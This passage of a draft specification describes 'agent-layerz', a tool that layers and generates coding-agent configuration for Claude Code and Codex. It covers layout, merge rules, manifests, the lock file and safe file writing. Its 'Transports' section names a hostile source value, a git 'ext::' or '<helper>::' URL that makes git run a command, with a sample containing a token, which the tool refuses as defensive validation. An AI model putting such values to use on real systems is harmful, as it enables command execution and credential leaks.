# LAYERING-SPEC.md — Layered agent configuration for any client and project

**Status:** Draft v1 · 2026-11-22 (§7.12 commit identity added; needs agent-layerz 0.2.0.
§7.13 account selection specified and planned in TASK-50, aligned with the tool facts in
`docs/target-facts.md` §12; built so far (TASK-50.8): the `account` layer field, who may
declare it, and the refusal of layers that set the account variables, none of which changes
generated output yet)
**Audience:** a coding agent (Claude Code / Codex) implementing the tool, and humans who use it
**Name:** `agent-layerz`, with the CLI command `alz`

This spec describes a **tool-agnostic layering system** for coding-agent configuration:
instructions, agents, skills, commands, hooks, permissions, MCP servers and model routing.
Layers are written once and composed into each repository. It works with any number of
clients and projects, any account setup, and both Claude Code and Codex. Other targets can
be added later.

> **Implementer:** read the whole spec before writing code. Section 12 lists facts to check
> against the *installed* versions of Claude Code and Codex before implementing the
> adapters. Never hardcode a frontmatter field or config key from this document without
> checking it first.

---

## 1. Problem

- Agent configuration is spread over many places: `~/.claude`, `~/.codex`, per-account
  config dirs, `CLAUDE.md`, `AGENTS.md`, `.claude/`, `.codex/`, `.agents/`, plugins.
- Each agent tool resolves name conflicts differently. In Claude Code, for example, a
  **project** subagent beats a user one, but a **personal** skill beats a project one. So a
  layered setup that relies on native precedence behaves inconsistently.
- Personal standards, client context and repo specifics are duplicated and drift apart.
- Per-account config dirs (one per client or subscription) fragment the user-level config,
  so switching accounts changes agent behaviour.

## 2. Goals and non-goals

**Goals**
1. Write each piece of configuration **once**, in the narrowest layer where it applies.
2. Use **deterministic, documented merge rules** that are the same for every target tool.
3. Make agent behaviour **independent of which account is active**.
4. Work for **any client/project shape**: single repo, multi-repo, monorepo, nested groups.
5. Keep **public-safe layers** (e.g. personal, open-source) free of private content, and
   enforce that by checks.
6. Make results **reproducible** (pinned layer versions) and **reviewable** (generated output
   shows up in diffs).
7. Support **multiple targets**: Claude Code and Codex in v1, more through adapters.
8. Optionally **choose the account folder** each repository's agent tools start with, from
   the layers and a machine-local user config, so a client's repositories start on that
   client's account (§7.13, planned).

**Non-goals (v1)**
- Running agents or orchestrating them. That is the orchestrator's job. (`alz run`, §7.13,
  only starts one tool with its account variable set.)
- Managing credentials and logins. Logging in stays with each tool. alz may choose which
  account folder a tool starts with (§7.13), but it never reads, copies or prints a login
  and never opens a file inside an account folder.
- Replacing a tool's native plugin system. It can coexist with one (see §11).

---

## 3. Concepts

| Term | Meaning |
|---|---|
| **Layer** | A versioned directory of config sources, usually its own git repo. Has a name, a visibility and a position in a stack. |
| **Stack** | An ordered list of layers applied to one repo, from most general to most specific. |
| **Target** | An agent tool whose native files we generate (`claude`, `codex`, later `gemini`, `opencode`, …). |
| **Item** | One unit of config: instruction block, agent, skill, hook, permission rule, MCP server, model route, setting. |
| **Overlay** | A partial item in a more specific layer that extends or changes an item from a more general layer. |
| **Slot** | A skill name that a general layer *references* and that more specific layers are expected to *fill* (e.g. `stack-conventions`). |
| **Build** | Resolving a stack and writing target-native files into the repo. |
| **Lock** | A file that pins the exact revision of every layer used in the last build. |

### 3.1 Layer kinds (convention, not hard-coded)

The tool supports **any number** of layers. The usual shape is:

```
personal   (public)   — your universal standards, generic agent personas, generic skills
org/client (private)  — client domain, constraints, compliance, shared stack choices
group      (private)  — optional: a product line or set of related repos within a client
repo       (private)  — repo-specific stack, commands, paths, contract ownership
```

`kind` is a free-form label, with one exception: only a layer with `kind: client` may
override the commit identity (§7.12) and, once built, the account (§7.13, planned).

Each layer declares a `visibility`: `public`, `private` or `confidential`. A layer may only
`extend` layers whose visibility is the **same or more public** (a public layer can't
extend a private one). Build output inherits the **most private** visibility in the stack.

---

## 4. File layout

### 4.1 Layer source layout (identical for every layer)

```
<layer-root>/
├── layer.yaml                 # layer metadata (§5.1)
├── instructions/
│   ├── 00-core.md             # concatenated in filename order
│   └── 50-<topic>.md
├── agents/
│   ├── <name>.md              # full agent definition (base)
│   └── <name>.overlay.md      # overlay on an agent from a more general layer
├── skills/
│   └── <name>/SKILL.md        # Agent Skills standard; may include scripts/, references/
├── commands/                  # optional; compiled to skills (see §7.4)
│   └── <name>.md
├── rules/                     # path-scoped rules (§7.10)
│   └── <name>.md
├── hooks/
│   ├── hooks.yaml             # declarative hook list (§7.5)
│   └── scripts/…              # hook scripts, referenced relatively
├── permissions.yaml           # allow / ask / deny (§7.6)
├── mcp.yaml                   # MCP server definitions (§7.7)
├── models.yaml                # role → model routing (§7.8)
├── settings.yaml              # other target settings, namespaced by target (§7.9)
└── targets/                   # optional raw passthrough per target (escape hatch)
    ├── claude/…
    └── codex/…
```

Every directory is optional. A layer may contain only `instructions/`.

**Item paths.** The merge rules (§7) read these paths of a layer, and only these:
- `layer.yaml` (§5.1);
- `instructions/<name>.md`, `commands/<name>.md` and `rules/<name>.md`, directly in their folder;
- `agents/<name>.md` (a base) and `agents/<name>.overlay.md` (an overlay), directly in `agents/`.
  `<name>` is never empty, so `agents/.overlay.md` is no item;
- `skills/<name>/<file>`: every file below a skill's folder belongs to that skill, `SKILL.md`
  included;
- `hooks/hooks.yaml`, and `hooks/scripts/<path>`: the scripts that a hook's `run:` names,
  relative to `hooks/` (§7.5);
- `permissions.yaml`, `mcp.yaml`, `models.yaml` and `settings.yaml`;
- `targets/claude/CLAUDE.extra.md` (§7.1), and `targets/<target>/<path>` for a known target
  (`claude`, `codex`), which are the passthrough files (§7.11).

Any other path, such as a README or a folder of notes, is part of the content hash (§5.3) but is
no item. One exception: each file below a folder in `targets/` whose name is not a known target
is an error (code `passthrough`) that names the file (§7.11). A file directly in `targets/` is no
item. The TypeScript `alz` merges files under any folder name there, warns for each file and
writes none of them (reference drift, TASK-55.5).

**Markdown frontmatter.** Instruction, agent, overlay, `SKILL.md`, command, rule and
`CLAUDE.extra.md` files are Markdown with optional YAML frontmatter. CRLF line ends are read as
LF.
- A file that starts with `---` and a line feed has a block. The block closes at the next line
  that is exactly `---`. The body is the text after that line's line feed, and is empty when the
  file ends there. A line such as `----` or `--- x` neither opens nor closes a block. The
  TypeScript `alz` closes the block at any line that starts with `---` (reference drift,
  TASK-55.5).
- The block is YAML, read with the rules of §7.13 "YAML limits". The whole file counts towards
  the 1 MiB cap and must be strict UTF-8. A YAML error is located at the file's line and column
  (codes `yaml`, `yaml-tag`).
  - An empty block, a block of comments only and a `null` block are an empty mapping.
  - Any other value that is not a mapping is the error `frontmatter must be a YAML mapping`
    (code `frontmatter`).
  - A block that is not closed is the error `frontmatter is not closed with '---'` (code
    `frontmatter`).
- A file that does not start that way has no block: an empty mapping, and the whole text as the
  body. Neither the 1 MiB cap nor the control-character rule applies to it, only the 16 MiB cap
  of every file (§5.3). It must still be valid UTF-8, or it is an error (code `frontmatter`). The
  TypeScript `alz` reads it with the invalid bytes replaced (reference drift, TASK-55.5).

### 4.2 Where layers live

- **Personal / public layers:** a git repo, e.g. `github.com/<you>/agent-layerz-personal`.
  Cloned to a cache (`~/.cache/agent-layerz/git-<hash>@<sha>`, §6) or used from a local
  checkout during development.
- **Client layers:** live in the client's **hub** repo at `<client-root>/hub/layer/`
  (see §4.4). The client root folder itself **need not and should not** be a git repo.
- **Group layers:** a private repo, or a subdirectory of the hub (`hub/layers/<group>/`).
- **Repo layer:** inside the repo at `.layer/` (same layout as §4.1, no separate repo).

### 4.3 Repo-level files

```
<repo>/
├── layer.yaml            # the stack manifest (§5.2)
├── layer.lock            # generated pin file (§5.3) — committed
├── .layer/               # repo layer sources
├── AGENTS.md             # GENERATED
├── CLAUDE.md             # GENERATED (thin: imports AGENTS.md + Claude-only block)
├── .claude/…             # GENERATED (agents, skills, settings.json, hooks)
├── .agents/skills/…      # GENERATED (shared Agent Skills dir for Codex & others)
├── .codex/…              # GENERATED (agents/*.toml, config.toml)
└── .mcp.json             # GENERATED if the target uses it
```

Every generated file starts with a header (or the format's equivalent) saying where it
came from:

```
<!-- GENERATED by agent-layerz — DO NOT EDIT. Source: <layer>@<rev>:<path> [+ overlays…]. Edit the source and run `alz build`. -->
```

Files the tool did not generate are **never overwritten**. A path collision is a build
error unless `--adopt` is passed, which turns the repo's hand-written agent config into repo-layer
sources first, so an existing repo needs only `alz init` and `alz build --adopt`:

| Hand-written | Becomes |
|---|---|
| `AGENTS.md` | `.layer/instructions/00-adopted.md` |
| `CLAUDE.md` | `.layer/targets/claude/CLAUDE.extra.md`, without `@AGENTS.md` and without paragraphs `AGENTS.md` already holds |
| `.claude/agents/*.md` | neutral agents; native-only fields go under `claude:` (§7.2), concrete models become `models.yaml` aliases; an agent a general layer defines becomes a `mode: replace` overlay |
| `.claude/skills/**`, `.claude/rules/*.md` | moved unchanged |
| `.claude/hooks/**` | moved to `.layer/hooks/`; hooks that run them use `run:` |
| `.claude/settings.json` | `permissions.yaml`, `hooks/hooks.yaml`, `settings.yaml`, `models.yaml` default, `workspace.add_dirs` |
| `.mcp.json` | `mcp.yaml` and `mcp.enable` |

`settings.json` and `.mcp.json` are adopted even when the build does not collide with them.
Adoption is planned in full before anything is written. If any part cannot be adopted safely
(an unknown permission tool, a literal env value in `.mcp.json`, a hook type other than
`command`), nothing changes and every problem is listed.

The rules below are the Rust `alz`'s (TASK-55.6). Where the TypeScript `alz` differs, the
paragraph says so; each difference is reference drift (decision-30).

**The header and its sources.** A source is written `<layer>@<rev>:<path>`, where `<rev>` is the
stack entry's `ref` or else the layer's `version`, or `<layer>:<path>` when there is neither.
Sources are joined with ` + `, and a file with no source names `no instructions`. Markdown files
(`AGENTS.md`, `CLAUDE.md`) start with the header as an HTML comment line. In an agent, skill,
command or rule file the header is a YAML comment line, `# ` and the header text, right after the
opening `---`. JSON files (`.claude/settings.json`, `.mcp.json`), copied skill files, hook scripts
and passthrough files carry no header. A file carries the **generated mark** when its first 1024
bytes hold `GENERATED by agent-layerz`, or the earlier `GENERATED by agent-layers`.

A source never leaves its comment, so it holds no control or format character (the class 1 set
of §10.1) and no `-->`. A layer file name with such a character already makes the layer invalid
(§5.3 "File names"). A source that still holds one, through the layer's `version`, the entry's
`ref` or the path, is the error `layer` at `<layer>:<path>`, and the build writes nothing. The
message is `a source of the generated header holds a control or format character or '-->', which
would end its comment; rename the file or change the version or ref`. The TypeScript `alz`
writes every source as it is.

**Which files are alz's own.** A file in the repository is alz's own only when one of these holds:
- it carries the generated mark;
- the previous `layer.lock` lists its path under `files`, and its current bytes hash to the value
  recorded there (`sha256:` and the hex digest, §5.3).

The previous lock is repository content and untrusted (§9), so a path it lists is not enough on
its own. alz overwrites or deletes only its own files, and never a protected path (§4.5). Nothing
else in the repository is ever overwritten or deleted. A build compares what it makes with the
repository, path by path:
- a path the build makes that does not exist is created;
- a path the build makes that exists and is alz's own is updated when its bytes or its executable
  bit differ;
- a path the build makes that exists and is not alz's own is a collision;
- a file in a folder the adapter manages (for Claude `.claude/agents`, `.claude/skills`,
  `.claude/rules` and `.claude/hooks`) is a collision when the build does not make it and it is
  not alz's own;
- a path the previous lock lists, that the build no longer makes and that is alz's own, is
  deleted, and the folders it leaves empty are removed, up to the repository root;
- a path the previous lock lists that is not alz's own any more is left alone.

So a hand-edited file without a header, such as `.claude/settings.json`, is a collision at the
next build, and `alz build --adopt` takes it into the repo layer. The TypeScript `alz` treats
every path the previous lock lists as its own, whatever the file holds.

**Links.** alz never writes, creates, renames or deletes through a link. Each path is opened one
component at a time from the repository root without following links (decision-27). A path the
build writes whose entry, or any folder above it inside the repository, is a symbolic link is a
collision, with the message `is a link or lies under one; alz never writes through a link`. An
entry where the build writes a file that is not a regular file (a folder, a FIFO, a device) is a
collision too, with the message `is not a regular file`. A link is never alz's own. The
TypeScript `alz` follows links.

**Paths that differ only in case.** Generated paths, the paths on disk they are compared with,
and protected paths (§4.5) are compared after case folding: two paths are the same when their NFD
forms are equal after ASCII lower-casing, as on a file system that ignores case (APFS, NTFS). So
`É` and `é` fold together (NFD splits off the accent), while letters with no ASCII base, such as
Greek sigma, stay apart. Two outputs of one build whose paths fold to the same path are an
error: a passthrough file is the error `passthrough` (§7.11), and the generated file is kept.
The TypeScript `alz` compares paths exactly.

**What the writer compares.** A file is read for the comparison up to 1 MiB (1048576 bytes); an
entry that is longer is a collision with the message `is larger than 1048576 bytes, which alz does
not compare`. In a folder the adapter manages, alz lists every file below it, never entering a
link: a link there is a collision, and an entry whose name is not valid UTF-8 or is not a safe
relative path (§5.3) is an error that names the folder. A file next to a generated path whose
name differs from it only in case (the folding above) is a collision with the message `differs
only in case from <name>, which is not generated by agent-layerz`, unless the previous lock lists
that name. A path that holds the previous lock's `layer.lock` or `.gitignore` is never deleted for
being listed, a path that is protected (§4.5) is never deleted, and neither `layer.yaml` nor a
file under `.layer/` is ever deleted or overwritten, whatever the lock lists or its hash says: a
build that would write one has the collision `is an input of agent-layerz (layer.yaml or a file
under .layer/), which a build never writes`. `.gitignore` that is not valid
UTF-8 is a collision with the message `is not valid UTF-8 text`. If a folder above a path became a
link, or a file where a folder is needed, after the plan was made, the write stops with an error
that names the path, and nothing is written through it.

**Writing.** The build writes nothing when it reports any error, a collision included. Each file
is written as a temporary file in its folder and renamed over its path, with mode `0644`, or
`0755` when it is executable, whatever the umask. A missing folder is created with mode `0777`
less the umask. `layer.lock` is written last, and only when its text changes, so a build that
stops part way leaves a lock that does not match and `alz check` fails.

**The `.gitignore` block.** With `commit_generated: false` (§8.3) the build keeps a managed block
at the end of `.gitignore`: the line `# >>> agent-layerz generated (do not edit this block)`, one
line `/<path>` for each generated path in name order (§6), and the line
`# <<< agent-layerz generated`. A block written under the earlier name (`agent-layers`) is
replaced. A line feed is added before the block when the text before it does not end with one.
Text outside the block is kept byte for byte. With `commit_generated: true` the block is removed.
`.gitignore` is the one file alz changes without owning it, and only inside the block; it is
written by the rules above, links included.

**Adoption, in detail.**
- The last stack entry must be a `path:` layer inside the repository, else the error `adopt`
  with the message `--adopt needs a repo layer inside the repo as the last stack entry (e.g.
  path:./.layer)`.
- Before anything is written, the planned repo layer is read with the checks every layer gets
  (§5, §7, §9.2) together with the layer files it adds to. Any text the reader would refuse, such
  as a control, format or line separator character, a name outside its grammar or a key the schema
  refuses, is a problem that names the native file and never prints the text (TASK-73).
- A problem prints text from the native files stripped (§10.1, class 1).
- JSON numbers are read exactly: a float is read as the nearest double, as JavaScript's
  `JSON.parse` reads it (decision-33, amended).
- A layer file that adoption adds to is read, merged (maps key by key, lists appended without
  duplicates) and written again with the emitter of §10.2. A value of another shape than the one on
  disk is a problem.
- `layer.yaml` is edited as text, never written again from a parsed tree. Each adopted directory
  is appended to `workspace.add_dirs` and each adopted server id to `mcp.enable`, unless the list
  already holds it. A block list gets a `- <value>` line after its last item, at the items'
  indent. A flow list on one line (`[a, b]`) gets `, <value>` before its `]`, or `<value>` when it
  is empty. A missing list is added in block style at the end of its section, and a missing
  section at the end of the file. A value is written plain when YAML reads it back as the same
  text, and otherwise double-quoted as §10.2 writes text. Every other byte, comments included,
  stays as it was.
- When the list or its section has a form this edit does not handle, nothing is adopted. Such
  forms are an anchor, an alias, a tag, a flow list over several lines or holding a comment, a
  flow mapping, or several documents. The problem names `layer.yaml` and the values to add by
  hand. The edited text must parse as a manifest (§5.2) that holds the added values and is
  otherwise unchanged, or nothing is adopted.
- The TypeScript `alz` writes the whole `layer.yaml` again with the `yaml` package, keeping
  comments, so its bytes can differ elsewhere in the file. It writes adoption problems with the
  native text as it is, and it does not check the planned layer first.

### 4.4 The client hub (multi-repo clients)

A multi-repo client gets one private **hub** repo, cloned next to the code repos. The hub
holds two separate things:

1. **The client layer**: agent *configuration* in `hub/layer/`. It is versioned with tags
   prefixed `layer-v*` so that doc commits don't force config releases.
2. **Shared project truth**: product, brand, domain, architecture decisions, cross-repo
   specs and the task board. These are *content*, not configuration. They are never
   compiled into repos. Agents read and write them in place.

```
<client-root>/                 (not git)
├── hub/                       private repo
│   ├── layer.yaml             the hub's own stack (it is also a "repo" for doc-role agents)
│   ├── .layer/                hub repo layer (e.g. doc-only permissions)
│   ├── layer/                 CLIENT LAYER sources (§4.1 layout), tagged layer-v*
│   ├── docs/                  product/, brand/, domain/, architecture/, adr/
│   ├── specs/NNN-slice/       spec.md, plan.md, review.md (cross-repo slices)
│   └── backlog/               Backlog.md board for the whole client (tasks labelled repo:*, slice:*)
├── <repo-a>/                  stack: personal → path:../hub/layer@layer-v* → ./.layer
└── <repo-b>/
```

Rules:
- Each code repo's manifest declares the hub in `workspace` (§5.2). The build generates the
  target's "additional directory" settings so agents can read the hub and write to it.
- Planning roles (designer, domain expert, architect) usually work **with the hub as their
  working directory**. Implementation roles work in code repos and use the hub only through
  the additional-directory setting.
- Contract ownership stays with the producing code repo (e.g. the backend owns the OpenAPI
  file). The hub links to it rather than copying it.
- Single-repo clients may skip the hub. The client layer then lives in its own repo, or in
  the repo's `.layer/`.
- **No `CLAUDE.md` / `AGENTS.md` at the client root.** Tools load ancestor instruction files
  natively, so content there would be loaded twice. `alz doctor` warns about this.

### 4.5 Protected paths (never generated, never overwritten)

The build must leave these alone, even when a layer has a file at the same path:

- `.claude/agent-memory/**` and any target's per-agent memory dirs. These are repo-owned
  lessons, committed to git, and they survive account switches by design.
- `backlog/**` (task boards), `docs/**`, `specs/**`.
- `.claude/settings.local.json`, any `*.local.*` file.

The list is extendable through `protected_paths:` in the repo manifest.

Each entry is a glob over the path from the repository root. `**` matches any number of
folders, and `**/` at least none. `*` matches any run of characters within one segment, and `?`
one Unicode scalar value within one segment (the TypeScript `alz` counts a UTF-16 unit, so its
`?` does not match a character outside the Basic Multilingual Plane: reference drift,
TASK-55.6). Every other character stands for itself. A leading `/` is ignored, and a pattern
without `/` matches the file name at any depth, as in `.gitignore`. A pattern and a path are
compared after the case folding of §4.3 ("Paths that differ only in case": the NFD form, then
ASCII lower case), so `Backlog/x.md` is protected like `backlog/x.md`; the TypeScript `alz`
matches case exactly (reference drift, TASK-55.6). A file that a layer ships at a protected path is left out of the
build, with the warning `protected` naming the path; it is not in the lock's `files`, and the
build never writes, updates or deletes it.

---

## 5. Manifests

### 5.1 `layer.yaml` (in every layer)

```yaml
name: personal                 # unique layer id
kind: personal                 # free-form label: personal | org | client | group | repo | …
visibility: public             # public | private | confidential
version: 1.4.0                 # semver; tag the repo with v<version>
description: Universal standards and generic agent personas
provides_slots:                # skills this layer fills (for lint/coverage)
  - arch-standards
requires_slots:                # skills this layer references but expects others to fill
  - stack-conventions
  - domain-glossary
forbid_patterns:               # leak guard for public layers (§9.2), regex
  - "(?i)\\b(acme|clientname)\\b"
commit_identity:               # optional; first layer or one client layer only (§7.12)
  name: Your Name
  email: you@example.com
account: client-a              # optional; first layer or one client layer only (§7.13)
```

Unknown fields are a schema error, so a layer that declares `commit_identity` needs
agent-layerz 0.2.0 or later, and a layer that declares `account` needs the minor release that
adds it (its release note names the version).

**Field rules** (TASK-55.3; the reference's behaviour unless a drift is named). Each error here is
`layer` at `<layer>:layer.yaml` and follows §10.1: it names the field and never prints its value.
- `name` is required: lower-case ASCII letters and digits in groups joined by a single `-` or
  `.`, that is `^[a-z0-9]+(?:[-.][a-z0-9]+)*$`.
- `kind` is required, non-empty text. It is a free-form label; only `client` has a meaning
  (§7.12).
- `visibility` is required: `public`, `private` or `confidential`.
- `version` and `description` are optional text.
- `provides_slots`, `requires_slots` and `forbid_patterns` are optional lists of text.
- `commit_identity` follows §7.12 and `account` follows §7.13.
- An optional field whose value is null, written as nothing, `~` or `null`, counts as absent. A
  required field that is null is reported as missing. `account` is the exception: `account: null`
  and a null name inside it are refused (§7.13).
- A field that expects text and holds a number is an error that suggests quoting the value:
  `version: 1.10` is the number 1.1, so it is written `version: "1.10"`. The TypeScript `alz`
  turns the number into text instead (`1.1`; reference drift, TASK-55.3).
- A `layer.yaml` with a `stack` field is a repository's stack manifest (§5.2), and is an error
  where a layer is expected.
- A layer without `layer.yaml` is the error `layer`, as is one whose `layer.yaml` is a link, a
  folder or anything but a regular file (§5.3): ``missing layer.yaml in layer '<source>'`` and
  ``layer.yaml in layer '<source>' must be a regular file, not a link or a folder``, with
  `<source>` stripped (§10.1). The file is opened without following a link and is never read
  when it is not a regular file, so a FIFO cannot block the command. A `layer.yaml` past 1 MiB
  or not valid UTF-8 is the error `yaml` (§7.13 "YAML limits").

### 5.2 `layer.yaml` (repo stack manifest)

```yaml
stack:
  - source: github:<you>/agent-layerz-personal@v1.4.0
  - source: path:../hub/layer                  # client layer inside the client hub (§4.4)
    ref: layer-v0.3.0                          # optional pin for path sources inside a git repo
  - source: path:./.layer                      # repo layer — always last
targets: [claude, codex]
workspace:
  hub: ../hub                                  # optional; enables hub access (§4.4)
  add_dirs: [../hub]                           # emitted as each target's additional-directory setting
protected_paths: []                            # extra paths the build must never touch (§4.5)
mcp:
  enable: [context7, playwright]               # allowlist; others defined in layers stay off
budgets:
  instructions_max_lines: 400                  # build fails if composed AGENTS.md exceeds
  always_loaded_skills_max: 0                  # skills preloaded into the main session
options:
  commit_generated: true                       # default true (§8.3)
  strict_slots: true                           # missing slot = error (else warning)
```

Supported `source` schemes: `path:`, `github:owner/repo@ref`, `git:<url>@ref`.

**Field rules** (TASK-55.3; the reference's behaviour unless a drift is named). Each error here is
`manifest` at `layer.yaml` and follows §10.1: it names the field and never prints its value. A
repository without `layer.yaml` is the error `no-manifest`.
- `stack` is required and is a non-empty list. Each entry is a mapping with `source` (text, one of
  the schemes above), optionally `ref`, and nothing else.
- `ref` is text that does not start with `-`, holds no `..` and holds only ASCII letters, digits,
  `.`, `_`, `/`, `+` and `-`. A `ref` that is a list, a mapping or a number is an error that names
  `stack[<n>].ref` (TASK-61). `ref: 1.10` is the number 1.1, so a ref that looks like a number is
  quoted: `ref: "1.10"`. The TypeScript `alz` converts the value with `String()`, so `[x]` becomes
  `x` and `1.10` becomes `1.1` (reference drift, TASK-61). `ref` pins a `path:` source (§6). A
  `github:` or `git:` source carries its ref after `@`; a `ref` field on such an entry is checked
  but has no effect, as in the reference.
- `targets` is a list of target names (§8), `claude` when absent. Any other name is an error that
  names `targets[<n>]`; the TypeScript `alz` reports it only when it looks up the adapter, and
  quotes the name.
- `workspace.hub` and each entry of `workspace.add_dirs` are non-empty paths relative to the
  repository: not absolute and not starting with `~`. A `\` is read as `/`, the path is
  normalised and a trailing `/` removed. Among the additional directories the hub comes first, and
  duplicates are dropped.
- `protected_paths` is a list of text. `mcp.enable` is a list of server ids (§7.7). An entry that
  is not a server id is a schema error, and the TypeScript `alz` takes any text there (reference
  drift, TASK-55.5).
- `budgets.instructions_max_lines`, `budgets.instructions_max_bytes` (32768 when absent, Codex's
  `project_doc_max_bytes`) and `budgets.always_loaded_skills_max` are whole numbers, 0 or more. A
  float without a fractional part, such as `2.0` or `1e3`, counts as a whole number (decision-28).
- `options.commit_generated` and `options.strict_slots` are `true` or `false`, and `true` when
  absent.
- `mcp`, `workspace`, `budgets` and `options` are mappings with only the fields above.
- An optional field or section whose value is null, written as nothing, `~` or `null`, counts as
  absent (an empty `mcp:` is no `mcp`). A required field that is null, such as `stack:` with
  nothing after it, is reported as missing.

**Source forms** (TASK-55.3). A `source` prints back as the text it was read from, byte for byte
(`layer.lock` and `allowed.yaml` store that text). Each error is `manifest` at `layer.yaml` and
names `stack[<n>].source`, never its value:
- `path:<dir>`: `<dir>` is not empty.
- `github:<owner>/<repo>@<ref>`: `<owner>` and `<repo>` are non-empty, hold only ASCII letters,
  digits, `.`, `_` and `-`, do not start with `-` and are not `.` or `..`.
- `git:<url>@<ref>`: `<url>` is not empty, does not start with `-` and names no transport
  helper (**Transports**, below).
- The ref is what follows the last `@`; it is not empty, holds no `:` (an `@` before a `:` is the
  user of a scp-like address, so `git:git@host:o/r.git` has no ref and is refused) and follows the
  `ref` rule above.
- A `https://` or `http://` scheme is matched ignoring case; the authority of a URL ends at the
  first `/`, `\`, `?` or `#`.

**Transports** (TASK-55.4). git reads `<helper>::<address>` as a request to run
`git-remote-<helper>`, and `ext::<command>` runs a command. A `git:` source whose text after `git:`
starts with ASCII letters, digits, `+`, `-` or `.` (possibly none) and then `::` is the error
`manifest` at `layer.yaml`, naming `stack[<n>].source` and saying that the URL must not be a
transport helper (`<helper>::<address>`). It is checked first, so `git:https::https://token@host/x.git`
is refused as a helper and the token is not printed. A remote `git:` or `github:` source is cloned
with `https` and `ssh` only (§6 "Git subprocesses").

**Credentials in a source** (TASK-65). A `git:` URL must not hold credentials. For a URL with
`://` the rule is applied to the whole text after `git:`, so a source without a ref
(`git:https://token@host/x.git`) is refused as holding credentials, not read as a URL and a ref cut
at the credentials' `@`:
- an `http://` or `https://` URL with a user name or password (`https://user@…`,
  `https://token@…`, `https://user:token@…`) is refused;
- any other URL with `://` whose user part holds a `:` (a password) is refused.

Any other text is a scp-like address, `[user@]host:path`. Its user part is what precedes the first
`@` of its first `/`-separated segment, and it is refused when that holds a `:`. The `@<ref>` is
left out first, when the last `@` starts a ref that is not empty and holds neither `:` nor `/`; a
ref that holds a `/` cannot be told from a host and a path, so the whole text is checked. So
`git:git@host:repo.git@v1`, `git:host.invalid:client.git@v1` and `git:x:y@v1` are accepted, and
`git:me:token@github.com/o/r` and `git:user:token@host:repo@v1` are refused. A scp-like source whose
ref holds a `/` and whose host and path hold a `:` before it (`git:host:repo.git@feature/x`) is
refused as holding credentials, because it cannot be told from `user:token@host/…`.

A user name alone stays allowed for `ssh://` and the scp-like form, as in
`git@github.com:owner/repo.git`. The error is `source`, with no location and the message
`a git: source in layer.yaml holds credentials in its URL; remove them and use a git credential
helper`. The source is never printed, so the token does not reach the terminal, `layer.lock` or
`allowed.yaml`. The TypeScript `alz` accepts such URLs (reference drift, TASK-71).

### 5.3 `layer.lock`

Generated by `alz build` / `alz update`. Records each layer's resolved revision
(commit SHA), a content hash, and the hash of every generated file. Used by `alz check`.

The lock is repository content, so it is untrusted. A layer `sha` that is not 40 or 64
lowercase hexadecimal characters makes the lock invalid, and the build stops before any cache
path is built from it.

**Reading the lock** (TASK-55.3, decision-33). `layer.lock` is read as at most 1 MiB of strict
UTF-8 and parsed as one JSON document nested at most 128 levels deep, counting the top-level
value as level 1, so at most 127 arrays or objects lie inside one another. A duplicate key in any object
makes the lock invalid, as does a `lockVersion` other than 1. An invalid lock is the error `lock` at
`layer.lock` (§10.1), and stops the command before any of its values is used. The TypeScript `alz`
keeps the last of two duplicate keys, as `JSON.parse` does (reference drift, TASK-55.3).

**What the content hash covers.** The path and content of every regular file of the layer, in
code point order (name order, §6), except `.env` files (never read), `.DS_Store`, and anything
under `.git` or `node_modules`. Symbolic links and other non-regular entries are not hashed.
The file mode is not part of the hash, so the hash alone does not notice a changed executable
bit. Its format does not change, so existing locks stay valid. One exception: the TypeScript
`alz` orders the files by UTF-16 unit (decision-30 leaves it unchanged), so for a layer with two
paths whose first difference is a character above U+FFFF in one and a character in
U+E000–U+FFFF in the other, the Rust `alz` computes a different hash from the one the
TypeScript `alz` wrote into its lock.

**Byte layout** (TASK-65). The content hash is the lowercase hexadecimal sha256 of one text
made of a record per file, in name order: the file's path relative to the layer directory,
with `/` between segments, then a NUL (U+0000), then the lowercase hexadecimal sha256 of the
file's bytes, then a line feed (U+000A). The records are joined with nothing between them and
the text is hashed as UTF-8. A path never holds a NUL and every digest has 64 characters, so
the text is unambiguous. `layer.lock` stores the hash in the layer entry's `contentHash` as
`sha256:` followed by those 64 characters, and the check compares that text exactly.

**`.env` files.** A `.env` file is a file whose own name, the last segment of its path, starts
with `.env`: `.env`, `.env.dev` and `.envrc` are, while `env.md`, and a file `x` inside a
folder named `.env`, are not. A `.env` file is never read and not hashed. The build reports
each one as the error `env-file`, and account resolution counts a layer that holds one as a
cache miss (`layer-invalid`), after the content check.

**File names** (TASK-65). Every name the walk of a layer lists must be valid Unicode, so that
it has exactly one UTF-8 form: files, folders, links and other entries alike, which is more
than the hash covers. The walk lists every entry, including those inside a folder whose name is
not valid, but never enters the skipped names (`.git`, `.DS_Store`, `node_modules`). A name that
is not valid Unicode, such as one holding the byte 0xFF on Linux or a lone surrogate on Windows,
makes the layer invalid. The test is the one Rust's `OsStr::to_str` makes. The build stops with
the error `layer` and the message `a file or folder name in layer '<source>' is not valid
UTF-8; rename it`, with no location. `<source>` is the stack entry, stripped as in every
diagnostic (decision-26, class 1), and the name itself is never printed. Account resolution
counts such a layer as a cache miss (`layer-invalid`). A path that a pinned layer's git tree
lists must be valid UTF-8 too, and is refused with the same error before anything is written
(§6). APFS and HFS+ refuse such a name when a file is created, so on macOS it can occur only on
another file system.

A name that is valid Unicode but holds a control or format character also makes the layer
invalid (TASK-55.6). Such characters are U+0000 to U+001F, U+007F to U+009F, U+2028, U+2029 and
every character of category Cf, the set §10.1 strips as class 1. Layer file names reach generated
paths and the sources of generated headers (§4.3), where a line feed would start a new line of
YAML frontmatter. This check follows the one for a name that is not valid Unicode, and it covers
the same names, the paths of a pinned layer's git tree included. The build stops with the error
`layer` and the message `a file or folder name in layer '<source>' holds a control or format
character; rename it`, with no location, and the name itself is never printed. Account resolution
counts such a layer as a cache miss (`layer-invalid`). The TypeScript `alz` accepts such names
(reference drift, TASK-55.6).

A name that is valid Unicode but not a safe relative path (`SafeRelPath`, §6: a backslash, a
`.` or `..` segment, or a `.git` segment in any case, with or without a trailing dot or space)
makes the layer invalid in the same way, and the check follows the one for a name that is not
valid Unicode. Account resolution counts it as a cache miss (`layer-invalid`). The build reports
it, like a file or folder that cannot be read, with the message of §6 step 2 (`layer '<source>'
holds a file that cannot be read or a name that is not allowed`) when the layer is read in place;
§6 step 2 gives the message for a clone and for a `tree2@` entry.

The order of the checks is fixed, so that the reason never depends on the order in which the
file system lists names. Account resolution walks the layer, stopping at entry 2001 (§7.13 "No
fetch on resolve"). It then checks, and the first that fails decides the miss: too many entries
(`unreadable`), a name that is not valid Unicode (`layer-invalid`), a name with a control or
